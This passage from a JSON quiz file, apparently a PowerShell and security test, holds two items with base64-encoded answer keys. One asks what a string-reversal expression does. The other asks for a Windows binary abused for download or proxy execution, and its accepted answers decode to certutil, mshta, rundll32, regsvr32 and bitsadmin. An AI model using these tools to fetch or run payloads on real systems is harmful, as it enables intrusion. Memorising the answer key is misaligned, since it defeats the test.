      "prompt": "What does $s[-1..-$s.Length] -join '' do?",
      "options": {
        "a": "Returns the last character of $s",
        "b": "Reverses the string"
      },
      "answer_b64": "Yg=="
    },
    {
      "id": 5,
      "source": "ps L4.6",
      "type": "text",
      "prompt": "Name one LOLBin abused for download or proxy execution.",
      "answer_b64": "Y2VydHV0aWw=",
      "accept_b64": [
        "Y2VydHV0aWw=",
        "Y2VydHV0aWwuZXhl",
        "bXNodGE=",
        "bXNodGEuZXhl",
        "cnVuZGxsMzI=",
        "cnVuZGxsMzIuZXhl",
        "cmVnc3ZyMzI=",
        "cmVnc3ZyMzIuZXhl",
        "Yml0c2FkbWlu"
      ]
    }
  ]
}
```
